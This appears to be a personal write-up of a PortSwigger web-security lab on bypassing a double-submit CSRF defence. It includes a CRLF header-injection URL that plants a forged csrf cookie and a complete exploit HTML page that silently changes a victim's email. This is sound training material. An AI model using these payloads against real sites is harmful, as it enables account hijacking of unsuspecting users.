# Lab: CSRF where token is duplicated in cookie

**End Goal:** Host an HTML page on the exploit server that uses a CSRF attack to change the viewer's email address.

**Login:** `wiener:peter`

**Analysis**

- Access lab --> log in as wiener --> go to **My account**
- DevTools --> **Application** tab --> **Cookies** --> there are two: `session` and `csrf`

csrf: 1jsq9QuZvE0TiRqKQlla4maGbVf5cTYE
session: 8ZWU0EekcntDL4BYUNk21yH1hcGr8Ttz

- Submit a test email --> DevTools **Network** --> the `change-email` request's **Payload** shows a `csrf` body param whose value is identical to the `csrf` cookie

*This is the "double submit" defence: the server just checks that the `csrf` body token equals the `csrf` cookie, and never checks whether the token is actually valid or tied to anything. So I don't need to steal a real token at all. If I set the cookie and the form field to the same made-up value, they'll match and the request is accepted.*

*I just need a way to set the victim's `csrf` cookie from my exploit page. Same gadget as the non-session-cookie lab: the search function reflects the search term into a `Set-Cookie` header with no sanitisation, so a CRLF (`%0d%0a`) injection lets me add my own `Set-Cookie: csrf=...` line. The search endpoint has no CSRF protection, so an `<img>` triggers it cross-site. `SameSite=None` lets the cookie ride along on my POST.*

- Pick any arbitrary value, e.g. `fake`
- Injection URL (sets the `csrf` cookie to `fake`):

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

Encoding: `%0d%0a` = CRLF (ends the header line), `%20` = space, `%3b` = `;`

- Build the exploit: a form that POSTs `email` + `csrf=fake`, plus an `<img>` that first sets the `csrf` cookie to `fake` and then, `onerror`, submits the form.

*The image request plants `csrf=fake` as the victim's cookie, then "fails" (it's not an image), firing `onerror` to submit the form. The form's `csrf=fake` matches the cookie I just set, so the double-submit check passes.*

- Click **Go to exploit server** --> paste the HTML --> Store
- **Deliver exploit to victim** --> their `csrf` cookie is overwritten with `fake`, the form submits with `csrf=fake` --> the two match --> email changes

**Answer:**

<form action="https://0a2500a303c0a8f481c417ac003d0006.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil-user.net">
  <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://0a2500a303c0a8f481c417ac003d0006.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">

